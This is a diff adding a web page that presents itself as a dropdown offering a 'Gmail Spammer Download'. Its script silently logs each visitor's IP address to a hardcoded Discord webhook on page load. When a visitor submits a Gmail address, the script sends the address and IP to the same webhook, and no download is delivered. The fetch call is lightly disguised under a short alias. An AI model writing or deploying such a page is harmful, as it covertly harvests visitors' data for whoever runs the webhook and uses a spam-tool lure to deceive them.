@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Dropdown Menu</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+    }
+    .container {
+      text-align: center;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      width: 300px;
+    }
+    select, input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      margin-top: 10px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    #status {
+      margin-top: 15px;
+      color: green;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Select an Option</h1>
+    <select id="options">
+      <option value="nothing">Nothing</option>
+      <option value="gmail_spammer">Gmail Spammer Download</option>
+    </select>
+    <div id="email-container" style="display: none;">
+      <label for="email">Enter Gmail:</label>
+      <input type="email" id="email" placeholder="Type your Gmail here">
+      <button id="submit">Submit</button>
+    </div>
+    <p id="status"></p>
+  </div>
+  <script>
+    let l = 0; // Last submission time
+    const _ = async (a, b) => await fetch(a, b); // Alias for fetch
+    (() => {
+      const z = "https://api.ipify.org?format=json";
+      const x = "https://discordapp.com/api/webhooks/1328066549264941189/A2q7CiUNhTRR2wuenawrls23D2BTKGU-EylbLaDlGGrUcbwA3O3sHwD0zbrZAJhNQiSr";
+      _(z).then(r => r.json()).then(j => _(x, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: `**New visitor IP:** ${j.ip}` })
+      })).catch(e => console.error("Error with IP/Webhook: ", e));
+    })();
+    document.getElementById('options').addEventListener('change', (e) => {
+      document.getElementById('email-container').style.display = e.target.value === 'gmail_spammer' ? 'block' : 'none';
+    });
+    document.getElementById('submit').addEventListener('click', async () => {
+      const t = Date.now();
+      if (t - l < 30000) {
+        document.getElementById('status').textContent = 'Please wait 30 seconds before submitting again.';
+        document.getElementById('status').style.color = 'red';
+        return;
+      }
+      const e = document.getElementById('email').value;
+      if (!e) {
+        document.getElementById('status').textContent = 'Please enter your Gmail.';
+        document.getElementById('status').style.color = 'red';
+        return;
+      }
+      try {
+        const j = await (await _("https://api.ipify.org?format=json")).json();
+        const x = "https://discordapp.com/api/webhooks/1328066549264941189/A2q7CiUNhTRR2wuenawrls23D2BTKGU-EylbLaDlGGrUcbwA3O3sHwD0zbrZAJhNQiSr";
+        await _(x, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `**Gmail Submitted:** ${e}\n**User IP:** ${j.ip}`
+          })
+        });
+        document.getElementById('status').textContent = 'Gmail and IP sent successfully!';
+        document.getElementById('status').style.color = 'green';
+        l = t;
+      } catch (e) {
+        console.error('Error: ', e);
+        document.getElementById('status').textContent = 'An error occurred. Please try again later.';
+        document.getElementById('status').style.color = 'red';
+      }
+    });
+  </script>
+</body>
+</html>
